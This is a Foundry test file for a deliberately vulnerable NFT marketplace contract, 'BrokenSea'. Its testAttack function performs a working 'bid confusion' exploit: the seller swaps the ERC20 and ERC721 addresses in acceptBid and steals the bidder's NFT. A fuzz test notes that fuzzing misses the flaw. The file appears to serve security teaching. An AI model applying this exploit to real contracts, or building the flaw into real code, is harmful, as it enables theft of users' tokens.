// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";

import {BrokenSea} from "src/BrokenSea.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("MockERC20", "MOCK", 18) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract MockERC721 is ERC721 {
    constructor() ERC721("MockERC721", "MOCK") {}

    function mint(address to, uint256 tokenId) public {
        _mint(to, tokenId);
    }

    function tokenURI(
        uint256 id
    ) public view virtual override returns (string memory) {}
}

contract BrokenSeaTest is Test {
    BrokenSea brokenSea;
    MockERC20 erc20;
    MockERC721 erc721;

    address bidder = makeAddr("bidder");
    address seller = makeAddr("seller");

    function setUp() public {
        brokenSea = new BrokenSea();
        erc20 = new MockERC20();
        erc721 = new MockERC721();

        // bidder and seller happen to have some coin already
        erc20.mint(bidder, 12345);
        erc20.mint(seller, 23456);

        // the bidder also happens to own the token id 666 of the NFT
        erc721.mint(bidder, 666);

        // bidder and seller are active traders on BrokenSea so have approvals set up
        vm.startPrank(bidder);
        erc721.setApprovalForAll(address(brokenSea), true);
        erc20.approve(address(brokenSea), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(seller);
        erc721.setApprovalForAll(address(brokenSea), true);
        erc20.approve(address(brokenSea), type(uint256).max);
        vm.stopPrank();

        // the seller has NFT 42
        erc721.mint(seller, 42);

        // create the bid: bidder offers to buy NFT 42 for 1000 coins
        vm.startPrank(bidder);
        brokenSea.createBid(erc721, 42, erc20, 1000);
        vm.stopPrank();
    }

    function testAttack() public {
        // seller can accept the bid and steal the token 666 for 42 coins (bid confusion!)
        vm.prank(seller);
        brokenSea.acceptBid(bidder, ERC721(address(erc20)), 42, ERC20(address(erc721)), 666);
    }

    // fuzzing doesn't find it even after 10M runs
    // [PASS] testAcceptBid(address,address,uint256,uint256) (runs: 10000000, μ: 15654, ~: 15654)
    function testAcceptBid(address someERC20, address someERC721, uint256 someTokenId, uint256 somePrice) public {
        // seller accepts the bid
        vm.prank(seller);

        // can verify the attack by uncommenting these lines:
        // someERC721 = address(erc20);
        // someTokenId = 42;
        // someERC20 = address(erc721);
        // somePrice = 666;

        try brokenSea.acceptBid(bidder, ERC721(someERC721), someTokenId, ERC20(someERC20), somePrice) {
            // if the bid is accepted, the exchange was done properly
            assertEq(erc721.ownerOf(42), bidder);
            assertEq(erc20.balanceOf(bidder), 12345 - 1000);
            assertEq(erc20.balanceOf(seller), 23456 + 1000);

            // unrelated, does not change hands
            assertEq(erc721.ownerOf(666), bidder);
        } catch {
            // pass
        }
    }
}
